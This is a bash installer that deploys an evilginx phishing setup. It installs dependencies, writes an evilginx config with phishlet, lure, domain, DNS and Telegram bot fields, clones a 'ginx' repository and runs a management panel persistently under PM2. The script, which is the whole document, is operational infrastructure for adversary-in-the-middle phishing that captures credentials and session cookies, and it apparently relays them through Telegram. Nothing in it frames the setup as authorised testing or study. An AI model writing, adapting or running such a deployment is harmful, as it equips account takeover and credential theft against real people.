#!/bin/bash

# Exit on error
set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to print colored messages
print_message() {
    local color=$1
    local message=$2
    echo -e "${color}${message}${NC}"
}

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Function to check if running as root
check_root() {
    if [ "$EUID" -ne 0 ]; then 
        print_message "$RED" "Please run as root (use sudo)"
        exit 1
    fi
}

# Function to install dependencies
install_dependencies() {
    print_message "$YELLOW" "Installing dependencies..."
    
    # Update package list
    apt-get update
    
    # Install required packages
    apt-get install -y \
        git \
        nodejs \
        npm \
        jq \
        sqlite3 \
        build-essential \
        golang \
        certbot \
        python3-certbot-nginx
    
    # Install/Update npm to latest version
    npm install -g npm@latest
    
    # Install PM2 globally
    npm install -g pm2
    
    print_message "$GREEN" "Dependencies installed successfully"
}

# Function to setup evilginx
setup_evilginx() {
    print_message "$YELLOW" "Setting up evilginx..."
    
    # Create .evilginx directory in user's home
    local user_home=$(getent passwd "$SUDO_USER" | cut -d: -f6)
    local evilginx_dir="$user_home/.evilginx"
    
    mkdir -p "$evilginx_dir"
    chmod 700 "$evilginx_dir"
    chown "$SUDO_USER:$SUDO_USER" "$evilginx_dir"
    
    # Create initial config.json if it doesn't exist
    if [ ! -f "$evilginx_dir/config.json" ]; then
        cat > "$evilginx_dir/config.json" << EOF
{
    "general": {
        "domain": "",
        "external_ipv4": "",
        "bind_ipv4": "",
        "https_port": 443,
        "dns_port": 53,
        "unauth_url": "https://www.google.com",
        "autocert": true,
        "telegram_bot_token": "",
        "telegram_chat_id": ""
    },
    "blacklist": {
        "mode": "unauth"
    },
    "lures": [],
    "phishlets": {},
    "certificates": {}
}
EOF
        chown "$SUDO_USER:$SUDO_USER" "$evilginx_dir/config.json"
        chmod 644 "$evilginx_dir/config.json"
    fi
    
    print_message "$GREEN" "Evilginx setup completed"
}

# Function to setup panel
setup_panel() {
    print_message "$YELLOW" "Setting up panel..."
    
    # Navigate to panel directory
    cd /opt/ginx/ginx/panel
    
    # Clean npm cache and node_modules
    rm -rf node_modules
    rm -f package-lock.json
    npm cache clean --force
    
    # Install dependencies with legacy peer deps flag
    npm install --legacy-peer-deps
    
    # Install next explicitly
    npm install next@latest --save
    
    # Create data directory if it doesn't exist
    mkdir -p data
    chown -R "$SUDO_USER:$SUDO_USER" data
    chmod 755 data
    
    # Run config monitor setup
    ./data/config_monitor.sh setup
    
    print_message "$GREEN" "Panel setup completed"
}

# Function to setup PM2
setup_pm2() {
    print_message "$YELLOW" "Setting up PM2..."
    
    # Navigate to panel directory
    cd /opt/ginx/ginx/panel
    
    # Start panel with PM2
    pm2 start ecosystem.config.js
    pm2 save
    
    # Setup PM2 to start on boot
    pm2 startup | tail -n 1 > /tmp/pm2_startup.sh
    chmod +x /tmp/pm2_startup.sh
    /tmp/pm2_startup.sh
    
    print_message "$GREEN" "PM2 setup completed"
}

# Function to verify installation
verify_installation() {
    print_message "$YELLOW" "Verifying installation..."
    
    # Check if next is installed
    if ! command_exists next; then
        print_message "$RED" "Next.js not found. Installing..."
        cd /opt/ginx/ginx/panel
        npm install next@latest --save
    fi
    
    # Check if all dependencies are installed
    cd /opt/ginx/ginx/panel
    if [ ! -d "node_modules" ]; then
        print_message "$RED" "node_modules not found. Reinstalling dependencies..."
        npm install --legacy-peer-deps
    fi
    
    print_message "$GREEN" "Installation verified"
}

# Main deployment function
deploy() {
    print_message "$YELLOW" "Starting deployment..."
    
    # Check if running as root
    check_root
    
    # Install dependencies
    install_dependencies
    
    # Clone repository if not already present
    if [ ! -d "/opt/ginx" ]; then
        print_message "$YELLOW" "Cloning repository..."
        git clone https://github.com/yourusername/ginx.git /opt/ginx
        chown -R "$SUDO_USER:$SUDO_USER" /opt/ginx
    fi
    
    # Setup evilginx
    setup_evilginx
    
    # Setup panel
    setup_panel
    
    # Verify installation
    verify_installation
    
    # Setup PM2
    setup_pm2
    
    print_message "$GREEN" "Deployment completed successfully!"
    print_message "$YELLOW" "Please configure your domain and external IP in $HOME/.evilginx/config.json"
    print_message "$YELLOW" "Then restart the panel with: pm2 restart panel"
}

# Run deployment
deploy 